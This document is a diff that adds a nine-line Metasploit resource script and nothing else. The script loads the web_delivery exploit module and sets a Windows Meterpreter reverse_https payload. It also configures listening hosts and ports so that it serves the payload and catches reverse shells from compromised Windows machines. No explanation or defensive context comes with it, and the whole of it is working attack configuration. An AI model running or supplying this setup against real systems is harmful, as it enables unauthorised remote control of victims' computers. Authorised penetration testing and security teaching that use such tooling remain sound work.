@@ -1,0 +1,9 @@
+use exploit/multi/script/web_delivery
+set SRVHOST 0.0.0.0
+set SRVPORT 8443
+set SSL true
+set target 2
+set payload windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+run -j
